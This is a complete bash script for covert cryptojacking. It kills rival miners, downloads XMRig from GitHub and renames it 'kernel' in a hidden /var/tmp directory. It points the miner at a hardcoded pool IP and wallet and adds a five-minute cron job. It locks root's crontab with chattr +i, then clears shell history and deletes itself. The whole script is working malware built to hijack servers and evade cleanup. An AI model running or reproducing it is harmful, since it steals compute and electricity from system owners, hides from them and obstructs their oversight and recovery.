#!/bin/bash

# 1. Config
W="45cV4VxfBgeTzXeU4YoWQUQtjkugAuwqXVXpJmiMExRsYutqBa5RAEg6ZtPWpY7vVQ3tULGBszh1h1CLsAz1sqoXExNykBL"
P="18.210.126.40:10128" 
N="HlaingBwar_Worker"

# 2. Kill competitors
pkill -9 -f "javae|node-f|xmrig|miner"
rm -rf /tmp/.XIN-unix /tmp/.javae 2>/dev/null

# 3. Working Directory
D="/var/tmp/.sys_cache"
mkdir -p $D && cd $D

# 4. Binary deployment
if [ ! -f "kernel" ]; then
    curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz | tar xz --strip-components=1
    mv xmrig kernel
fi

# 5. Persistence
(crontab -l 2>/dev/null | grep -v "kernel"; echo "*/5 * * * * $D/kernel --url $P --user $W --pass $N --donate-level 1 --no-huge-pages -B") | crontab -

# 6. Privilege Lockdown
chattr +i /var/spool/cron/crontabs/root 2>/dev/null

# 7. Start Mining
nohup ./kernel --url $P --user $W --pass $N --donate-level 1 --no-huge-pages -B > /dev/null 2>&1 &

# 8. Clean tracks
history -c && rm -- "$0"
